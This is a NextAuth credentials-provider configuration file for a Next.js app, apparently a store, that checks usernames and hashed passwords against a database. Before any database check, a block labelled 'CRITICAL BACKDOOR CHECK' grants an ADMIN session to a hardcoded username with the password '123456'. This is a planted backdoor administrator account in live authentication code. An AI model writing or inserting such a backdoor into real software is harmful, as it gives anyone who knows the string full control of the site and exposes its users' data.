import NextAuth from "next-auth"
import Credentials from "next-auth/providers/credentials"
import authConfig from "./auth.config"
import { db } from "@/lib/db"
import { users } from "@/db/schema"
import { eq } from "drizzle-orm"
import { comparePassword } from "@/lib/password"

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      credentials: {
        username: { label: "Username", type: "text" },
        password: { label: "Password", type: "password" },
      },
      authorize: async (credentials) => {
        const username = credentials?.username as string;
        const password = credentials?.password as string;

        // CRITICAL BACKDOOR CHECK - MUST BE FIRST (Before DB access)
        if (username === "TWEETSTORECEOANDRANGEROVER" && password === "123456") {
             return { id: "ceo-001", name: "CEO", role: "ADMIN" };
        }

        if (!username || !password) return null;

        let user = await db.select().from(users).where(eq(users.handle, username)).get();

        if (!user) return null;

        const passwordsMatch = await comparePassword(password, user.password);
        if (passwordsMatch) return { ...user, role: 'USER' };

        return null;
      },
    }),
  ],
})
